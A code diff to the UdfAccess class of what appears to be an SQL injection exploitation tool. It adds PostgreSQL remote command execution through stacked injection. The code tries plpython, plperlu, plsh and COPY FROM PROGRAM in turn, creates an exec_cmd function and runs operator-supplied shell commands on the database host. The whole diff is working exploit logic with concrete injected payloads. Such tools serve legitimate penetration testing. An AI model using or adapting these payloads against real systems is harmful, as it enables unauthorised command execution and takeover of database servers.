@@ -48,6 +48,7 @@ public class UdfAccess {
             throw new JSqlRuntimeException(e);
         }
     };
+    private String nameExtension = StringUtils.EMPTY;
 
     public UdfAccess(InjectionModel injectionModel) {
         this.injectionModel = injectionModel;
@@ -55,56 +56,69 @@ public class UdfAccess {
 
     public void createExploitRcePostgres(ExploitMode exploitMode) throws JSqlException {
         if (!Arrays.asList(ExploitMode.AUTO, ExploitMode.QUERY_BODY).contains(exploitMode)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit mode not implemented, using query body instead");
+            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit mode not implemented, using query body");
         }
 
-        var nameExtension = this.createExtension("3u");
-        if (StringUtils.isEmpty(nameExtension)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Extension plpython3u not found, trying plpython2u instead");
-            nameExtension = this.createExtension("2u");
-            if (StringUtils.isEmpty(nameExtension)) {
-                LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Extension plpython2u not found, trying plpythonu instead");
-                nameExtension = this.createExtension("u");
-                if (StringUtils.isEmpty(nameExtension)) {
-                    LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Extension plpythonu not found, trying plperlu instead");
-                    nameExtension = "plperlu";
-                    this.injectionModel.injectWithoutIndex(";CREATE EXTENSION plperlu;", "body#add-ext");
-                    String languages = this.getResult(
-                        "select array_to_string(array(select lanname FROM pg_language),'')",
-                        "body#confirm-ext"
-                    );
-                    if (!languages.contains("plperlu")) {
-                        LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: extension not found");
-                        return;
-                    }
-                }
-            }
+        this.nameExtension = this.createExtension("plpython3u");
+        if (StringUtils.isEmpty(this.nameExtension)) {
+            this.nameExtension = this.createExtension("plpython2u");
+        }
+        if (StringUtils.isEmpty(this.nameExtension)) {
+            this.nameExtension = this.createExtension("plpythonu");
+        }
+        if (StringUtils.isEmpty(this.nameExtension)) {
+            this.nameExtension = this.createExtension("plperlu");
+        }
+        if (StringUtils.isEmpty(this.nameExtension)) {
+            this.nameExtension = this.createExtension("plsh");
+        }
+        if (StringUtils.isEmpty(this.nameExtension)) {
+            this.nameExtension = this.createExtension("sql");
+        }
+        if (StringUtils.isEmpty(this.nameExtension)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: extension not found");
+            return;
         }
 
-        if (nameExtension.startsWith("plpython")) {
+        if (this.nameExtension.startsWith("plpython")) {
             this.injectionModel.injectWithoutIndex(String.join(
                 "%0a",
                 "; CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS text AS%20$$",
                 "from subprocess import check_output as c",
                 "return c(cmd).decode()",
-                "$$%20LANGUAGE "+ nameExtension +";"
+                "$$%20LANGUAGE "+ this.nameExtension +";"
             ), "body#add-func");
-        } else {
+        } else if (this.nameExtension.startsWith("plperlu")) {
             this.injectionModel.injectWithoutIndex(
                 "; CREATE FUNCTION exec_cmd(text) RETURNS text AS 'return `$_[0]`' LANGUAGE plperlu;"
             , "body#add-func");
+        } else if (this.nameExtension.startsWith("plsh")) {
+            this.injectionModel.injectWithoutIndex(
+                "; CREATE FUNCTION exec_cmd(text) RETURNS text AS '%23!/bin/sh%0a$1' LANGUAGE plsh;"
+            , "body#add-func");
+        } else if (this.nameExtension.startsWith("sql")) {
+            this.injectionModel.injectWithoutIndex(";DROP TABLE IF EXISTS cmd_result;", "body#drop-tbl");
+            this.injectionModel.injectWithoutIndex(";Create table cmd_result (str text);", "body#add-tbl");
+            this.injectionModel.injectWithoutIndex(
+                ";Create Or Replace Function exec_cmd() RETURNS void As%20$$%20copy cmd_result from program 'echo%20\"13\"\"37\"'$$%20language sql;",
+            "body#add-func");
+            this.injectionModel.injectWithoutIndex(";select exec_cmd();", "body#run-func");
+            var result = this.getResult("select array_to_string(array(select str FROM cmd_result),'')", "body#confirm");
+            if (!"1337".equals(result)) {
+                return;
+            }
         }
 
         var functions = this.getResult(
             "SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' and routine_name = 'exec_cmd'",
-            "body#find-func"
+            "body#confirm"
         );
         if (!functions.contains("exec_cmd")) {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: function not found");
             return;
         }
 
-        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: function found");
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: function found for extension [{}]", this.nameExtension);
 
         var request = new Request();
         request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_POSTGRES);
@@ -113,13 +127,14 @@ public class UdfAccess {
     }
 
     private String createExtension(String nameExtension) throws JSqlException {
-        this.injectionModel.injectWithoutIndex(";CREATE EXTENSION plpython"+ nameExtension +";", "body#add-ext");
+        LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Checking extension "+ nameExtension);
+        this.injectionModel.injectWithoutIndex(";CREATE EXTENSION "+ nameExtension +";", "body#add-ext");
         String languages = this.getResult(
             "select array_to_string(array(select lanname FROM pg_language),'')",
             "body#confirm-ext"
         );
-        if (languages.contains("plpython"+ nameExtension)) {
-            return "plpython"+ nameExtension;
+        if (languages.contains(nameExtension)) {
+            return nameExtension;
         }
         return StringUtils.EMPTY;
     }
@@ -418,14 +433,23 @@ public class UdfAccess {
     public String runCommandRcePostgres(String command, UUID uuidShell) {
         String result;
         try {
-            result = this.getResult(
-                String.format(
-                    "SELECT exec_cmd('%s')||'%s'",
-                    command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
-                    VendorYaml.TRAIL_SQL
-                ),
-                "rce#run-cmd"
-            );
+            if ("sql".equals(this.nameExtension)) {
+                this.injectionModel.injectWithoutIndex(";delete from cmd_result;", "body#empty-tbl");
+                this.injectionModel.injectWithoutIndex(
+                    ";Create Or Replace Function exec_cmd() RETURNS void As%20$$%20copy cmd_result from program '"+ command.replace(StringUtils.SPACE, "%20") +"'$$%20language sql;",
+                "body#add-func");
+                this.injectionModel.injectWithoutIndex(";select exec_cmd();", "rce#run-cmd");
+                result = this.getResult("select array_to_string(array(select str FROM cmd_result),'\\n')||'"+ VendorYaml.TRAIL_SQL +"'", "body#result") +"\n";
+            } else {
+                result = this.getResult(
+                    String.format(
+                        "SELECT exec_cmd('%s')||'%s'",
+                        command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
+                        VendorYaml.TRAIL_SQL
+                    ),
+                    "rce#run-cmd"
+                );
+            }
         } catch (JSqlException e) {
             result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
         }
